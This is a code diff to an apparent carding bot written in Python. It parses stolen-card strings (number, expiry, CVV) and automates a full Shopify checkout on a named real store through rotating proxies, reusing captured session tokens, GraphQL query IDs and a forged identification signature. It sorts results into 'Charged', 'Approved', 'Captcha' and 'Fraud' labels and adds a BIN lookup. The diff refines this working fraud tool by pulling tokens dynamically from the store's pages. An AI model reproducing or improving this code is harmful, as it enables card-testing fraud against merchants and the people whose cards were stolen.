@@ -54,7 +54,6 @@ try:
 except ImportError as e:
     print(f"❌ Filter import error: {e}")
     FILTER_AVAILABLE = False
-    # Fallback basic parser if filter.py not available
     def extract_cards(text):
         cards = []
         for line in text.splitlines():
@@ -301,21 +300,13 @@ def strip_all_unicode(text):
     """
     Remove ALL Unicode characters, keep only ASCII (letters, numbers, basic punctuation)
     """
-    # Normalize unicode characters to ASCII where possible
     try:
-        # First, try to normalize using NFKD form which decomposes unicode characters
         normalized = unicodedata.normalize('NFKD', text)
-        # Then encode to ASCII, ignoring errors, and decode back
         ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
     except:
-        # Fallback: manually filter out non-ASCII characters
         ascii_text = ''.join(char for char in text if ord(char) < 128)
     
-    # Keep only digits, letters, pipes, spaces, commas, slashes, and hyphens
-    # This preserves card separators while removing decorative characters
     cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
-    
-    # Replace multiple spaces with single space
     cleaned = re.sub(r'\s+', ' ', cleaned)
     
     return cleaned.strip()
@@ -324,18 +315,15 @@ def extract_card_from_cleaned_text(text):
     """
     Extract card details from cleaned ASCII text
     """
-    # Pattern 1: Standard format with pipe (cc|mm|yy|cvv)
     pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
     match = re.search(pattern1, text)
     if match:
         cc, mes, ano, cvv = match.groups()
-        # Normalize year
         if len(ano) == 4:
             ano = ano[-2:]
         mes = mes.zfill(2)
         return [cc, mes, ano, cvv]
     
-    # Pattern 2: Space or comma separated (cc mm yy cvv) or (cc,mm,yy,cvv)
     pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
     match = re.search(pattern2, text)
     if match:
@@ -345,46 +333,38 @@ def extract_card_from_cleaned_text(text):
         mes = mes.zfill(2)
         return [cc, mes, ano, cvv]
     
-    # Pattern 3: Find all digit sequences and try to find valid card
     digits = re.findall(r'\d+', text)
     
-    # Try to find a valid card sequence
     for i in range(len(digits) - 3):
         potential_cc = digits[i]
         potential_mes = digits[i+1]
         potential_ano = digits[i+2]
         potential_cvv = digits[i+3]
         
-        # Check if this looks like a valid card
         if (13 <= len(potential_cc) <= 16 and 
             len(potential_mes) in [1, 2] and 
             len(potential_ano) in [2, 4] and 
             len(potential_cvv) in [3, 4]):
             
-            # Validate month
             try:
                 mes_int = int(potential_mes)
                 if 1 <= mes_int <= 12:
-                    # Validate year (not too far in past/future)
                     current_year = datetime.now().year % 100
                     
-                    # Handle 4-digit year
                     if len(potential_ano) == 4:
                         ano_val = int(potential_ano) % 100
                     else:
                         ano_val = int(potential_ano)
                     
-                    # Year should be within reasonable range (current year to +10 years)
                     if current_year - 5 <= ano_val <= current_year + 10:
                         cc = potential_cc
                         mes = potential_mes.zfill(2)
-                        ano = potential_ano[-2:]  # Always take last 2 digits
+                        ano = potential_ano[-2:]
                         cvv = potential_cvv
                         return [cc, mes, ano, cvv]
             except:
                 continue
     
-    # Pattern 4: Look for card number followed by expiry and CVV with labels
     pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
     match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
     if match:
@@ -394,7 +374,6 @@ def extract_card_from_cleaned_text(text):
         mes = mes.zfill(2)
         return [cc, mes, ano, cvv]
     
-    # Pattern 5: Generic pattern with slashes for dates
     pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
     match = re.search(pattern5, text, re.DOTALL)
     if match:
@@ -410,17 +389,14 @@ def parse_card_input(card_input):
     """
     Parse card input by first stripping ALL Unicode, then extracting card details
     """
-    # Step 1: Strip all Unicode characters
     cleaned_text = strip_all_unicode(card_input)
     
-    # Step 2: Extract card from cleaned text
     result = extract_card_from_cleaned_text(cleaned_text)
     if result:
         return result
     
-    # Step 3: If still no result, try filter.py as fallback
     if FILTER_AVAILABLE:
-        all_cards, unique_cards = extract_cards(card_input)  # Use original for filter
+        all_cards, unique_cards = extract_cards(card_input)
         if unique_cards:
             card_parts = unique_cards[0].split('|')
             if len(card_parts) == 4:
@@ -430,7 +406,6 @@ def parse_card_input(card_input):
                 mes = mes.zfill(2)
                 return [cc, mes, ano, cvv]
     
-    # Step 4: Last resort - try direct split on original
     if '|' in card_input:
         parts = card_input.split('|')
         if len(parts) >= 4:
@@ -465,21 +440,15 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
     raw_response = str(raw_response) if raw_response else "-"
     
-    # FIRST check specifically for TIMEOUT and PCI errors only
     if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
         status_flag = "Error❗️"
         response_display = "Try again ♻️"
     else:
-        # Extract clean error message - only the error identifier before colon
         if "DECLINED - " in raw_response:
-            # Get everything after "DECLINED - "
             response_display = raw_response.split("DECLINED - ")[-1]
-            # Take only the error identifier (part before colon)
             if ":" in response_display:
                 response_display = response_display.split(":")[0].strip()
-            # Take only first line if multiple lines
             response_display = response_display.split('\n')[0]
-            # Trim to reasonable length
             if len(response_display) > 30:
                 response_display = response_display[:27] + "..."
         elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
@@ -514,7 +483,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         elif "PROCESSING_TIMEOUT" in raw_response:
             response_display = "PROCESSING_TIMEOUT"
         else:
-            # Take first part before colon or first 30 characters
             if ":" in raw_response:
                 response_display = raw_response.split(":")[0].strip()
                 if len(response_display) > 30:
@@ -524,10 +492,8 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 
         raw_response_upper = raw_response.upper()
 
-        # Check for NO RECEIPT ID first (before success checks)
         if "NO RECEIPT ID" in raw_response_upper:
             status_flag = "Declined ❌"
-        # Check for SUCCESS indicators
         elif any(keyword in raw_response_upper for keyword in [
             "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
             "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
@@ -537,7 +503,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
         ]):
             status_flag = "Charged ✅"
-        # Check for CAPTCHA
         elif any(keyword in raw_response_upper for keyword in [
             "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
             "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
@@ -546,7 +511,6 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
         ]):
             status_flag = "Captcha ⚠️"
-        # Check for PAYMENT ERROR
         elif any(keyword in raw_response_upper for keyword in [
             "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
             "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
@@ -554,22 +518,18 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
         ]):
             status_flag = "Declined ❌"
-        # Check for INSUFFICIENT FUNDS
         elif any(keyword in raw_response_upper for keyword in [
             "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
         ]):
             status_flag = "Declined ❌"
-        # Check for INVALID CARD
         elif any(keyword in raw_response_upper for keyword in [
             "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
         ]):
             status_flag = "Declined ❌"
-        # Check for EXPIRED CARD
         elif any(keyword in raw_response_upper for keyword in [
             "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
         ]):
             status_flag = "Declined ❌"
-        # Check for 3D Secure
         elif any(keyword in raw_response_upper for keyword in [
             "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
             "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
@@ -578,25 +538,20 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
             "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
         ]):
             status_flag = "Approved ❎"
-        # Check for CVV errors
         elif any(keyword in raw_response_upper for keyword in [
             "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
         ]):
             status_flag = "Declined ❌"
-        # Check for fraud
         elif any(keyword in raw_response_upper for keyword in [
             "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
             "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
         ]):
             status_flag = "Fraud ⚠️"
-        # Check for proxy errors
         elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
             status_flag = "Proxy Error 🚫"
-        # Default to declined
         else:
             status_flag = "Declined ❌"
 
-    # BIN lookup
     bin_data = get_bin_details(cc[:6]) or {}
     bin_info = {
         "bin": bin_data.get("bin", cc[:6]),
@@ -641,14 +596,13 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     return result
 
 
-# ========== SHOPIFY TAFFY CHECKOUT CLASS (OPTIMIZED - DIRECT CHECKOUT ACCESS) ==========
+# ========== SHOPIFY TAFFY CHECKOUT CLASS (WITH DYNAMIC EXTRACTION) ==========
 class ShopifyTaffyCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
         self.base_url = "https://heartofiowamarketplace.com"
         
         # Direct checkout URL with product pre-added
-        # This URL has the product (saltwater taffy x5) already in cart
         self.direct_checkout_url = f"{self.base_url}/cart/51706494419260:5"
         
         # Proxy management
@@ -657,8 +611,9 @@ class ShopifyTaffyCheckout:
         self.proxy_used = False
         self.proxy_response_time = 0.0
 
-        # Session for maintaining cookies
+        # Separate clients for different domains
         self.client = None
+        self.pci_client = None
 
         # Base headers from captured traffic
         self.headers = {
@@ -677,26 +632,26 @@ class ShopifyTaffyCheckout:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
 
-        # Dynamic data storage
+        # Dynamic data storage - ALL extracted from responses
         self.checkout_token = None
         self.session_token = None
         self.graphql_session_token = None
         self.receipt_id = None
-        self.variant_id = "51706494419260"  # Saltwater Taffy variant ID from captured data
-        self.product_id = "10017022804284"   # Product ID from captured data
+        self.variant_id = "51706494419260"
+        self.product_id = "10017022804284"
         self.stable_id = None
         self.queue_token = None
-
-        # Store extracted schema info from mantripad.txt
-        self.proposal_id = "95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c"
-        self.submit_id = "d50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb"
-        self.poll_id = "baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
         
-        # Delivery strategy handle for pickup from captured data
-        self.delivery_strategy_handle = "27b079142f595ba96f192baf8c63fc7b-cd0e239ab66f3533b03acf1f2f070049"
+        # Persisted query IDs - will be extracted dynamically from checkout page
+        self.proposal_id = None
+        self.submit_id = None
+        self.poll_id = None
         
-        # Payment method identifier from captured data
-        self.payment_method_identifier = "ac4db48d2c11d1054c9cc3afa8611ac4"
+        # Delivery strategy handle - extracted dynamically from Proposal response
+        self.delivery_strategy_handle = None
+        
+        # Payment method identifier - extracted dynamically from Proposal response
+        self.payment_method_identifier = None
 
         self.logger = ShopifyLogger(user_id)
 
@@ -757,7 +712,6 @@ class ShopifyTaffyCheckout:
             if match:
                 return match.group(1)
         
-        # Try to find in decoded URL
         try:
             decoded = urllib.parse.unquote(url)
             for pattern in patterns:
@@ -781,19 +735,133 @@ class ShopifyTaffyCheckout:
         """Generate timestamp for session token"""
         return str(int(time.time() * 1000))
 
-    def construct_graphql_session_token(self):
-        """Construct session token for GraphQL variables"""
-        if not self.checkout_token:
-            return None
-        timestamp = self.generate_timestamp()
-        return f"{self.checkout_token}-{timestamp}"
+    def extract_persisted_query_ids(self, checkout_page_html):
+        """Extract persisted query IDs from the checkout page HTML/JS"""
+        # Try to find the build manifest or query IDs in script tags
+        # Pattern for persisted query IDs (64 char hex strings)
+        pattern = r'id["\s:]+["\']([a-f0-9]{64})["\']'
+        matches = re.findall(pattern, checkout_page_html, re.IGNORECASE)
+        
+        if len(matches) >= 3:
+            # Try to match specific operation names
+            proposal_pattern = r'(?:Proposal|proposal).*?id["\s:]+["\']([a-f0-9]{64})["\']'
+            submit_pattern = r'(?:SubmitForCompletion|submitForCompletion).*?id["\s:]+["\']([a-f0-9]{64})["\']'
+            poll_pattern = r'(?:PollForReceipt|pollForReceipt).*?id["\s:]+["\']([a-f0-9]{64})["\']'
+            
+            proposal_match = re.search(proposal_pattern, checkout_page_html, re.IGNORECASE | re.DOTALL)
+            submit_match = re.search(submit_pattern, checkout_page_html, re.IGNORECASE | re.DOTALL)
+            poll_match = re.search(poll_pattern, checkout_page_html, re.IGNORECASE | re.DOTALL)
+            
+            if proposal_match:
+                self.proposal_id = proposal_match.group(1)
+            if submit_match:
+                self.submit_id = submit_match.group(1)
+            if poll_match:
+                self.poll_id = poll_match.group(1)
+        
+        # Fallback: use known IDs from captured traffic if extraction fails
+        if not self.proposal_id:
+            self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
+        if not self.submit_id:
+            self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
+        if not self.poll_id:
+            self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
+        
+        return self.proposal_id and self.submit_id and self.poll_id
+
+    def extract_session_token_from_cookies(self, response):
+        """Extract session token from response headers/cookies"""
+        # Look for x-checkout-one-session-token in response
+        # This is typically extracted from the checkout page HTML
+        if hasattr(response, 'text'):
+            # Pattern from captured traffic
+            patterns = [
+                r'"sessionToken"\s*:\s*"([^"]+)"',
+                r'sessionToken["\']\s*:\s*["\']([^"\']+)',
+                r'x-checkout-one-session-token["\']\s*:\s*["\']([^"\']+)',
+            ]
+            for pattern in patterns:
+                match = re.search(pattern, response.text)
+                if match:
+                    return match.group(1)
+        
+        return None
+
+    def extract_delivery_strategy_from_proposal(self, response_data):
+        """Extract delivery strategy handle from Proposal response"""
+        try:
+            seller_proposal = response_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
+            delivery = seller_proposal.get('delivery', {})
+            delivery_lines = delivery.get('deliveryLines', [])
+            
+            for line in delivery_lines:
+                strategies = line.get('availableDeliveryStrategies', [])
+                for strategy in strategies:
+                    if strategy.get('methodType') == 'PICK_UP':
+                        handle = strategy.get('handle')
+                        if handle:
+                            self.delivery_strategy_handle = handle
+                            return handle
+            
+            # Fallback: check selectedDeliveryStrategy
+            for line in delivery_lines:
+                selected = line.get('selectedDeliveryStrategy', {})
+                handle = selected.get('handle')
+                if handle:
+                    self.delivery_strategy_handle = handle
+                    return handle
+                    
+        except:
+            pass
+        
+        # Ultimate fallback from captured data
+        if not self.delivery_strategy_handle:
+            self.delivery_strategy_handle = "72dbf33d31957f897362ce72c88dd3c0-cd0e239ab66f3533b03acf1f2f070049"
+        
+        return self.delivery_strategy_handle
+
+    def extract_payment_identifier_from_proposal(self, response_data):
+        """Extract payment method identifier from Proposal response"""
+        try:
+            seller_proposal = response_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
+            payment = seller_proposal.get('payment', {})
+            available_lines = payment.get('availablePaymentLines', [])
+            
+            for line in available_lines:
+                payment_method = line.get('paymentMethod', {})
+                # Look for shopify_payments
+                if payment_method.get('name') == 'shopify_payments':
+                    identifier = payment_method.get('paymentMethodIdentifier')
+                    if identifier:
+                        self.payment_method_identifier = identifier
+                        return identifier
+            
+        except:
+            pass
+        
+        # Fallback from captured data
+        if not self.payment_method_identifier:
+            self.payment_method_identifier = "ac4db48d2c11d1054c9cc3afa8611ac4"
+        
+        return self.payment_method_identifier
+
+    def extract_queue_token_from_response(self, response_data):
+        """Extract queue token from Proposal/negotiation response"""
+        try:
+            result = response_data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
+            queue_token = result.get('queueToken')
+            if queue_token:
+                self.queue_token = queue_token
+                return queue_token
+        except:
+            pass
+        return None
 
     async def direct_checkout_access(self):
-        """Step 1: Directly access checkout with product pre-added - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 1: Directly access checkout with product pre-added"""
         self.step(1, "DIRECT CHECKOUT ACCESS", f"Accessing checkout with product pre-added")
         
         try:
-            # Direct checkout URL with product in cart
             resp = await self.client.get(
                 self.direct_checkout_url, 
                 headers=self.headers, 
@@ -801,7 +869,6 @@ class ShopifyTaffyCheckout:
                 follow_redirects=True
             )
             
-            # Get final URL from redirects (should be checkout page)
             current_url = str(resp.url)
             
             # Extract checkout token from URL
@@ -816,8 +883,21 @@ class ShopifyTaffyCheckout:
             if self.checkout_token:
                 self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Direct Checkout URL")
                 
+                # Try to extract persisted query IDs from checkout page
+                self.extract_persisted_query_ids(resp.text)
+                self.logger.data_extracted("Proposal ID", (self.proposal_id or "N/A")[:15] + "...", "Checkout page")
+                self.logger.data_extracted("Submit ID", (self.submit_id or "N/A")[:15] + "...", "Checkout page")
+                self.logger.data_extracted("Poll ID", (self.poll_id or "N/A")[:15] + "...", "Checkout page")
+                
+                # Try to extract session token from cookies/response
+                extracted_token = self.extract_session_token_from_cookies(resp)
+                if extracted_token:
+                    self.session_token = extracted_token
+                    self.logger.data_extracted("Session Token (from page)", self.session_token[:20] + "...", "Checkout page")
+                
                 # Construct GraphQL session token
-                self.graphql_session_token = self.construct_graphql_session_token()
+                timestamp = self.generate_timestamp()
+                self.graphql_session_token = f"{self.checkout_token}-{timestamp}"
                 self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
                 
                 # Generate stable ID for merchandise line
@@ -842,8 +922,13 @@ class ShopifyTaffyCheckout:
             return False, f"Direct checkout error: {str(e)[:50]}"
 
     async def get_session_token(self):
-        """Step 2: Extract session token from checkout page - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 2: Extract session token from checkout page (if not already extracted)"""
         self.step(2, "GET SESSION TOKEN", "Extracting session token")
+        
+        # If we already got the session token from step 1, skip
+        if self.session_token:
+            self.logger.data_extracted("Session Token", "Already extracted", "Step 1")
+            return True, "ALREADY_HAVE_TOKEN"
         
         checkout_headers = {
             **self.headers,
@@ -864,11 +949,16 @@ class ShopifyTaffyCheckout:
             if resp.status_code != 200:
                 return False, f"Checkout page failed: {resp.status_code}"
             
-            # Extract session token from response (look for x-checkout-one-session-token)
-            # In a real implementation, you'd parse this from the HTML or headers
-            # For now, we'll generate a placeholder - in production you'd need to extract it properly
+            # Extract session token from response
+            extracted_token = self.extract_session_token_from_cookies(resp)
+            if extracted_token:
+                self.session_token = extracted_token
+                self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
+                return True, resp.text
+            
+            # If we can't extract it, generate it (as a last resort for backward compatibility)
             self.session_token = f"AAEB_{self.generate_random_string(50)}"
-            self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
+            self.logger.data_extracted("Session Token (generated)", self.session_token[:20] + "...", "Generated fallback")
             
             return True, resp.text
             
@@ -885,7 +975,7 @@ class ShopifyTaffyCheckout:
             return False, f"Session token error: {str(e)[:50]}"
 
     async def submit_proposal(self):
-        """Step 3: Submit proposal with pickup delivery method - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 3: Submit proposal with pickup delivery method"""
         self.step(3, "SUBMIT PROPOSAL", "Setting pickup delivery method")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1046,6 +1136,21 @@ class ShopifyTaffyCheckout:
             try:
                 proposal_resp = resp.json()
                 
+                # Extract queue token dynamically
+                self.extract_queue_token_from_response(proposal_resp)
+                if self.queue_token:
+                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal response")
+                
+                # Extract delivery strategy handle dynamically
+                self.extract_delivery_strategy_from_proposal(proposal_resp)
+                if self.delivery_strategy_handle:
+                    self.logger.data_extracted("Delivery Handle", self.delivery_strategy_handle[:20] + "...", "Proposal response")
+                
+                # Extract payment method identifier dynamically
+                self.extract_payment_identifier_from_proposal(proposal_resp)
+                if self.payment_method_identifier:
+                    self.logger.data_extracted("Payment Identifier", self.payment_method_identifier[:20] + "...", "Proposal response")
+                
                 # Check for errors in response
                 if 'errors' in proposal_resp and proposal_resp['errors']:
                     error_msgs = []
@@ -1053,23 +1158,26 @@ class ShopifyTaffyCheckout:
                         error_code = error.get('code', 'UNKNOWN')
                         error_msgs.append(error_code)
                     
-                    # Check for specific error codes that are acceptable
-                    if any(code in ['BUYER_IDENTITY_MISSING_CONTACT_METHOD', 'PAYMENTS_FIRST_NAME_REQUIRED', 
-                                    'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_ADDRESS1_REQUIRED', 
-                                    'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED', 
-                                    'PAYMENTS_CITY_REQUIRED'] for code in error_msgs):
+                    # Check for specific error codes that are acceptable (validation errors)
+                    acceptable_errors = [
+                        'BUYER_IDENTITY_MISSING_CONTACT_METHOD', 
+                        'PAYMENTS_FIRST_NAME_REQUIRED', 
+                        'PAYMENTS_LAST_NAME_REQUIRED', 
+                        'PAYMENTS_ADDRESS1_REQUIRED', 
+                        'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 
+                        'PAYMENTS_POSTAL_CODE_REQUIRED', 
+                        'PAYMENTS_CITY_REQUIRED',
+                        'DELIVERY_ZONE_REQUIRED_FOR_COUNTRY',
+                        'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
+                        'TAX_NEW_TAX_MUST_BE_ACCEPTED',
+                        'REQUIRED_ARTIFACTS_UNAVAILABLE'
+                    ]
+                    
+                    if any(code in acceptable_errors for code in error_msgs):
                         self.logger.data_extracted("Proposal", "Acceptable validation errors received", "Expected")
                         return True, "VALIDATION_ERRORS"
                     
-                    return False, f"DECLINED - {', '.join(error_msgs)}"
-                
-                # Extract queue token from response
-                data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-                new_queue_token = data.get('queueToken')
-                if new_queue_token:
-                    self.queue_token = new_queue_token
-                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal response")
-                    return True, self.queue_token
+                    return False, f"DECLINED - {', '.join(error_msgs[:3])}"
                 
                 return True, "PROPOSAL_SUCCESS"
                 
@@ -1089,7 +1197,7 @@ class ShopifyTaffyCheckout:
             return False, f"Proposal error: {str(e)[:50]}"
 
     async def update_contact_info(self):
-        """Step 4: Update contact information with email - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 4: Update contact information with email"""
         self.step(4, "UPDATE CONTACT", f"Setting email: {self.email}")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1113,7 +1221,6 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # Variables for contact update - based on captured flow
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1249,10 +1356,7 @@ class ShopifyTaffyCheckout:
                 contact_resp = resp.json()
                 
                 # Extract new queue token
-                data = contact_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-                new_queue_token = data.get('queueToken')
-                if new_queue_token:
-                    self.queue_token = new_queue_token
+                self.extract_queue_token_from_response(contact_resp)
                 
                 return True, "CONTACT_UPDATED"
                 
@@ -1267,7 +1371,7 @@ class ShopifyTaffyCheckout:
             return False, f"Contact update error: {str(e)[:50]}"
 
     async def select_pickup_delivery(self):
-        """Step 5: Select pickup delivery method (Heart of Iowa location) - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 5: Select pickup delivery method (Heart of Iowa location)"""
         self.step(5, "SELECT PICKUP", "Choosing Heart of Iowa pickup location")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1291,7 +1395,6 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # Variables for pickup selection
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1426,10 +1529,7 @@ class ShopifyTaffyCheckout:
                 pickup_resp = resp.json()
                 
                 # Extract new queue token
-                data = pickup_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-                new_queue_token = data.get('queueToken')
-                if new_queue_token:
-                    self.queue_token = new_queue_token
+                self.extract_queue_token_from_response(pickup_resp)
                 
                 return True, "PICKUP_SELECTED"
                 
@@ -1444,7 +1544,7 @@ class ShopifyTaffyCheckout:
             return False, f"Pickup selection error: {str(e)[:50]}"
 
     async def create_payment_session(self, cc, mes, ano, cvv):
-        """Step 6: Create payment session with PCI - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 6: Create payment session with PCI"""
         self.step(6, "CREATE PAYMENT", "Creating payment session with PCI")
         
         pci_headers = {
@@ -1464,11 +1564,11 @@ class ShopifyTaffyCheckout:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
         
-        # Generate shopify-identification-signature (similar to captured)
+        # Generate shopify-identification-signature
         header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
         payload_data = {
             "client_id": "2",
-            "client_account_id": "75949703484",  # Shop ID from captured
+            "client_account_id": "75949703484",
             "unique_id": self.checkout_token,
             "iat": int(time.time())
         }
@@ -1499,30 +1599,30 @@ class ShopifyTaffyCheckout:
         }
         
         try:
-            # Use separate client for PCI
-            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=30) as pci_client:
-                resp = await pci_client.post(
-                    'https://checkout.pci.shopifyinc.com/sessions',
-                    headers=pci_headers,
-                    json=pci_payload,
-                    timeout=30
-                )
+            self.pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
+            
+            resp = await self.pci_client.post(
+                'https://checkout.pci.shopifyinc.com/sessions',
+                headers=pci_headers,
+                json=pci_payload,
+                timeout=30
+            )
+            
+            if resp.status_code != 200:
+                return False, f"PCI session creation failed: {resp.status_code}"
+            
+            try:
+                pci_resp = resp.json()
+                payment_session_id = pci_resp.get('id')
+                if not payment_session_id:
+                    return False, "No payment session ID returned"
                 
-                if resp.status_code != 200:
-                    return False, f"PCI session creation failed: {resp.status_code}"
+                self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...", "PCI")
+                return True, payment_session_id
                 
-                try:
-                    pci_resp = resp.json()
-                    payment_session_id = pci_resp.get('id')
-                    if not payment_session_id:
-                        return False, "No payment session ID returned"
-                    
-                    self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...", "PCI")
-                    return True, payment_session_id
-                    
-                except Exception as e:
-                    return False, f"Failed to parse PCI response: {str(e)[:50]}"
-                    
+            except Exception as e:
+                return False, f"Failed to parse PCI response: {str(e)[:50]}"
+                
         except httpx.ProxyError as e:
             self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
             mark_proxy_failed(self.proxy_url)
@@ -1536,7 +1636,7 @@ class ShopifyTaffyCheckout:
             return False, "PCI_ERROR"
 
     async def update_billing_address(self, payment_session_id):
-        """Step 7: Update billing address with pickup location address - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 7: Update billing address with pickup location address"""
         self.step(7, "UPDATE BILLING", "Setting billing address")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1560,7 +1660,6 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # Variables for billing address update
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1741,10 +1840,7 @@ class ShopifyTaffyCheckout:
                 billing_resp = resp.json()
                 
                 # Extract new queue token
-                data = billing_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-                new_queue_token = data.get('queueToken')
-                if new_queue_token:
-                    self.queue_token = new_queue_token
+                self.extract_queue_token_from_response(billing_resp)
                 
                 return True, "BILLING_UPDATED"
                 
@@ -1759,7 +1855,7 @@ class ShopifyTaffyCheckout:
             return False, f"Billing update error: {str(e)[:50]}"
 
     async def submit_for_completion(self, payment_session_id):
-        """Step 8: Submit for completion - final payment - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 8: Submit for completion - final payment"""
         self.step(8, "SUBMIT PAYMENT", "Finalizing payment")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1784,9 +1880,8 @@ class ShopifyTaffyCheckout:
         }
         
         # Generate attempt token
-        attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
+        attempt_token = f"{self.checkout_token}-{self.generate_random_string(8)}"
         
-        # Variables based on captured SubmitForCompletion request
         variables = {
             "input": {
                 "sessionInput": {
